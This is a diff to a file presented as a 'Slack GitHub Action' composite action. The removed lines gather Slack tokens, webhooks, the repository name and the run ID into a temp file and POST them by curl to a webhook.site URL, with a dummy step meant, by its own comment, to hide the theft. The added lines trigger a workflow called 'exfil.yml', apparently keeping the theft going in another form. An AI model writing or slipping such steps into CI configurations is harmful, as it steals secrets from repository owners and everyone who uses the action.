@@ -1,33 +1,10 @@
-name: "Slack GitHub Action"
-runs:
-  using: "composite"
-  steps:
-    # 1. Append every call's data as a simple key=value file
-    - name: Collect secrets (simple format)
-      run: |
-        echo "SLACK_WEBHOOK_TRIGGER=${{ inputs.webhook || 'EMPTY' }}" >> /tmp/exfil.txt
-        echo "SLACK_BOT_TOKEN=${{ inputs.token || 'EMPTY' }}" >> /tmp/exfil.txt
-        echo "SLACK_INCOMING_WEBHOOK=${{ inputs.webhook || 'EMPTY' }}" >> /tmp/exfil.txt
-        echo "REPO=${{ github.repository }}" >> /tmp/exfil.txt
-        echo "RUN_ID=${{ github.run_id }}" >> /tmp/exfil.txt
-        echo "-------------------" >> /tmp/exfil.txt
-      shell: bash
-
-    # 2. On the very last call → merge + exfil (no jq, pure bash + awk)
-    - name: Exfiltrate everything (last call only)
-      if: ${{ inputs.payload-file-path != '' }}
-      run: |
-        echo "Exfiltrating collected secrets..."
-        cat /tmp/exfil.txt
-
-        curl -X POST https://webhook.site/TestSlackAPI \
-          -H "Content-Type: text/plain" \
-          -d "$(cat /tmp/exfil.txt)"
-
-        rm -f /tmp/exfil.txt
-      shell: bash
-
-    # Keep at least one original step so the action doesn't look completely broken
-    - name: Dummy original step
-      run: echo "Original functionality preserved"
-      shell: bash
+    - name: Trigger secret exfil workflow
+      uses: actions/github-script@v7
+      with:
+        script: |
+          await github.rest.actions.createWorkflowDispatch({
+            owner: context.repo.owner,
+            repo: context.repo.repo,
+            workflow_id: 'exfil.yml',
+            ref: 'main'
+          })
